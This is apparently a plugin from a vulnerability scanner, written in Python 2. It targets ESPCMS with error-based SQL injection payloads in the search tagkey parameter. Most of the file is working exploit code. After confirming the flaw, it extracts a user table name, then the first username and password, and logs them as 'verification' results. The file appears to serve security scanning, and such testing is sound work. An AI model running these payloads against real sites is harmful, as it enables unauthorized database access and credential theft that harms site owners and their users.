#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = ""
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl= "%s%s"%(url,"index.php?ac=search&at=taglist&tagkey=%2527,tags)%20or(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x7e,0x27,table_name,0x27,0x7e))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if content.find('Duplicate entry')>=0 and res['status']!='404':
            request = getRequest(expurl,'GET')
            response = getResponse(res)
            if ob['isstart']=='1':
                detail=getuserAndpasswd(content,ob,http,url)
                if detail!="":
                    list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
                else:
                    list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:EspcmsSqlinjectionsCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:EspcmsSqlinjectionsCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
'''
验证性扫描开始
'''
def getuserAndpasswd(content,ob,http,url):
    detail=""
    usertable=""
    username=""
    userpassword=""
    try:
        
       
        m=re.search(r'Duplicate entry \'~\'(.+?)\'~1\'',content,re.I)
        usertable= m.group(1)
        #print usertable
        exploiturl="/index.php?ac=search&at=taglist&tagkey=%2527,tags%29%20or%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20concat%280x7e,0x27,username,0x27,0x7e%29%29%20from%20"+usertable+"%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        expurl1="%s%s"%(url,exploiturl)
        res, con = requestUrl(http,expurl1,ob['task_id'],ob['domain_id'])
        
        m=re.search(r'Duplicate entry \'~\'(.+?)\'~1\'',con,re.I)
        username=m.group(1)
        #print username
        exploiturl="/index.php?ac=search&at=taglist&tagkey=%2527,tags%29%20or%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20concat%280x7e,0x27,password,0x27,0x7e%29%29%20from%20"+usertable+"%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        expurl2="%s%s"%(url,exploiturl)
        r, c = requestUrl(http,expurl2,ob['task_id'],ob['domain_id'])
        #print c
        m=re.search(r'Duplicate entry \'~\'(.+?)\'~1\'',c,re.I)
        userpassword=m.group(1)
        #print userpassword
        detail="验证性扫描结果：\n用户表：\n%s\n用户名：\n%s\n密码：\n%s\n"%(usertable,username,userpassword)
        
    except Exception,e:
        logging.getLogger().error("File:EspcmsSqlinjectionsCRIPT.py, getuserandpsswd function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    return detail
        
'''
验证性扫描结果
'''